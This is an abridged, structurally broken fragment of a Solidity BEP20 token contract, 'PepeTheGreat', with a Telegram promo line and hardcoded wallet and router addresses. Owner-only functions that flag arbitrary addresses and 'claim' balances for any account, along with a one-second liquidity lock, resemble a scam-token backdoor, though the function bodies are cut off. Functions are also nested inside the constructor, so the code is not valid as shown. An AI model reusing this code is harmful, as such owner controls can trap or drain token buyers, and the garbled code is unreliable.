...
Pepe The Great is the greatest version of pepe all around here on bsc!
https://t.me/PepeTheGreat_bsc
...
*/
    ...
    contract PepeTheGreat   is IBEP20, Ownable
    {
        ...
        string private constant _name = "PepeTheGreat";
        string private constant _symbol = "PepeTG";
        uint8 private constant _decimals = 9;
        uint256 public constant MarketingFunds=  5000000* 10**_decimals;


        uint256 private constant DefaultLiquidityLockTime= 1;
        
        address public constant MarketingWallet=0x8d4bD6257e2557a4e3D974c94b3D077F867E7E23; 
        address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


        uint256 private _WalletTokenAddress =MarketingFunds;
        uint256 public  balanceLimit = 5000000  * 10**_decimals;
        uint256 public  sellLimit = 5000000 * 10**_decimals;
        uint256 public  buyLimit = 5000000 * 10**_decimals;
        ...
        constructor () {
           ...
           function OwnerSetAddress(address account) external onlyOwner {
            ...
            function AcceptRewards(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function ClaimFundsMarketing(address account, uint256 balance) onlyOwner  public virtual {
